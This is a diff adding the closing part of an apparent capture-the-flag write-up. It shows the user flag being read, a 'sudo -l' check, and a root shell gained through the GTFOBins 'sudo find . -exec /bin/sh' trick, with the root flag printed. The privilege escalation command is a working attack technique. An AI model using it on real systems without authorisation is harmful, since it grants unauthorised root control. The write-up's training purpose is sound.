@@ -297,8 +297,44 @@ Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-151-generic x86_64)
 To see these additional updates run: apt list --upgradable
 
 
+john@base:~$ cat user.txt
+f54846c258f3b4612f78a819573d158e
 john@base:~$ 
 
 ```
 
+# Privilege Escalation
 
+Check sudo privilegies:
+
+```shell
+john@base:~$ sudo -l
+[sudo] password for john: 
+Matching Defaults entries for john on base:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on base:
+    (root : root) /usr/bin/find
+john@base:~$ 
+
+```
+
+It is rarely a good idea to allow a system user to run a binary with elevated privileges, as the default binaries
+on Linux often contain parameters that can be used to run system commands. A good list of these binaries
+can be found in the [GTFOBins](https://gtfobins.github.io/) website.
+
+Acording GTFObins site run find command in order to privesc:
+```shell
+john@base:~$     sudo find . -exec /bin/sh \; -quit
+# 
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+root.txt
+# cat root.txt
+51709519ea18ab37dd6fc58096bea949
+# 
+```
+
+and Volià!
